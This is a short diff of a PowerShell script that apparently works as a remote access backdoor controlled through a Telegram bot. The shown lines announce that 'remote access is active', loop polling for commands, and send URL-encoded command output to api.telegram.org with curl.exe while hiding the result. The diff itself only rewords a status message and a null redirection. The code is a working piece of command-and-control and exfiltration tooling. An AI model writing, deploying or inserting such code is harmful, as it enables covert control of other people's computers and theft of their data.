@@ -12,7 +12,7 @@ while (-not $chatId) {
     if (-not $chatId) { Start-Sleep 2 }
 }
 
-Write-Host "[+] Chat ID: $chatId! Remote access is active..." -ForegroundColor Green
+Write-Host "[+] Got Chat ID: $chatId! Agent active..." -ForegroundColor Green
 $lastUpdateId = 0
 
 while ($true) {
@@ -40,7 +40,7 @@ while ($true) {
                     
                     Write-Host $output -ForegroundColor White
                     $encodedOut = [System.Web.HttpUtility]::UrlEncode("`n$output")
-                    & curl.exe -s "https://api.telegram.org/bot$Token/sendMessage?chat_id=$chatId&text=$encodedOut" > <#nul#> 2>&1
+                    & curl.exe -s "https://api.telegram.org/bot$Token/sendMessage?chat_id=$chatId&text=$encodedOut" > $null
                 }
             }
         }
